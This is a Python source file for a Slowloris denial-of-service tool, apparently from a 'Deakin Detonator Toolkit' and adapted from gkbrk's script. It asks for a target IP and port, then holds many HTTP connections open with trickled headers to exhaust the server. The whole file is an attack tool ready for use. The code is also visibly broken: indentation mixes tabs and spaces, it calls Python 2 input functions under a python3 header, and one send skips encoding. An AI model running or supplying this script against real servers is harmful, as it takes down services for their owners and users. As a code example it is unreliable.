#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
This script is a modified version of gkbrk's (2020) Slowloris script.

dkbrk 2020, Low bandwidth DoS tool. Slowloris rewrite in Python., GitHub, retrieved 13 May 2020, <github.com/gkbrk/slowloris>
'''
import random, socket, sys, time, os

list_of_sockets = []

def init_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    s.connect((ip, port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    s.send("User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n")
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s


def SLOWLORIS():
	os.system("clear")
		
	print("                                                              ")
	print("                        DOS: Slowloris                        ")
	print("                   Deakin Detonator Toolkit                   ")
	print("                                                              ")
    	
	ip = raw_input("\nTarget IP: ")
   	socket_count = int(raw_input("\nNumber of connections to open (default is 150): ") or 150)
	port = int(raw_input("\nTarget port (default is 80): ") or 80)
    	
	print("\nAttacking {}:{} with {} sockets.".format(ip, port, socket_count))

    	for _ in range(socket_count):
        	try:
            		s = init_socket(ip, port)
        	
		except socket.error as e:
            		break
        	
		list_of_sockets.append(s)

    	while True:
        	try:
            		for s in list(list_of_sockets):
                		try:
                   			s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                		except socket.error:
                    			list_of_sockets.remove(s)

            		for _ in range(socket_count - len(list_of_sockets)):
                		try:
                    			s = init_socket(ip, port)
                    			if s:
                        			list_of_sockets.append(s)
                		except socket.error as e:
                    			break
            			time.sleep(15)

       		except (KeyboardInterrupt, SystemExit):
			print("\nStopping Slowloris\n")
			break
